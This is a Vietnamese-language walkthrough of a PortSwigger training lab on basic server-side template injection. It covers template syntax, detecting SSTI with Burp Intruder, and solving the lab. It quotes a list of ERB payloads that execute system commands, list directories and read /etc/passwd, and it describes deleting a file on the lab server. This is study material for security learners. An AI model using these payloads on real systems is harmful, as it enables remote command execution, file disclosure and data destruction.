# Basic server-side template injection
https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic

## Giải thích nhanh về Template
- Ví dụ ta có 1 form tạo event như sau
![img.png](img.png)
- Underlying Code để render
![img_1.png](img_1.png)
- Để ý thấy phần gọi là `dynamic content` như `<%= @event.description %>`.
- Phần `static content` như là `Description:`
- Sau khi web render xong thì
![img_2.png](img_2.png)
- Ngoài ra ta có thể thấy 1 basic template như email: 
![img_3.png](img_3.png)
### Systax
- Cú pháp ở mỗi Programming languages sẽ khác nhau
- Ví dụ
  - ERB (Embedded Ruby- is a templating language based on Ruby): `<%= @event.description %>`
  - Jinja (is a web template engine for the Python programming language): `{{ user.username }}`
  - FreeMarker (is a free Java-based template engine): `${name}`
- Ngoài ra còn nhiều template engine khác...

### Injection
- Lấy ví dụ về event template với cách lấy dynamic data như sau
![img_4.png](img_4.png)
- Giá trị `event.name` được lấy động từ database để render cho templete và hiển thị lên web, cách này coi như ko thể injection vì người dùng ko thể thay đổi, hay chèn script từ ngoài vào.
- Vậy nếu như nó được phép nhập từ ngoài vào (user.input) để hiển thị trực tiếp lên thì sao, ví dụ
![img_5.png](img_5.png)
- Ta có thể detect là thử điền vào giá trị User input: `<%= 7*7 %>`
- Nếu templete xử lý và hiển thị theo những gì mình inject vào nghĩa là ta detect đc SSTI
![img_6.png](img_6.png)

## Steps
![img_7.png](img_7.png)

## Phân tích
- Ta view detai 1 sản phẩm thì thấy `Unfortunately this product is out of stock` thông báo hiện trên homepage
![img_8.png](img_8.png)
- Ngoài ra, in Burp, ta thấy 1 GET req sử dụng `message` parameter để render thông báo đó.
- Ta detect SSTI xem sao: gởi GET này vào Intruder, add payload cho giá trị `message`.
![img_11.png](img_11.png)
- Insert payload với 2 cách:
  - Cách 1: dùng payload của [HackTrick](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#detect) rồi dùng nó trong Intruder as Simple list.
![img_9.png](img_9.png)
  - Cách 2: với Burp pro, ta có sẵn payload
![img_10.png](img_10.png)
- Nhớ Grep-Extract
![img_12.png](img_12.png)
- Run attack xem
![img_13.png](img_13.png)
- Đây chính là template dùng ERB
![img_14.png](img_14.png)

## Resolve lab
- Do là ERB, nên trong web hacktrick, ta search các payload để exploit (https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby)
```
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```
- Check với whoami command, nhớ Ctrl+U để URL encoded. User là carlos
![img_15.png](img_15.png)
![img_16.png](img_16.png)
![img_17.png](img_17.png)
- Xóa file morale.txt
![img_18.png](img_18.png)
- Done
![img_19.png](img_19.png)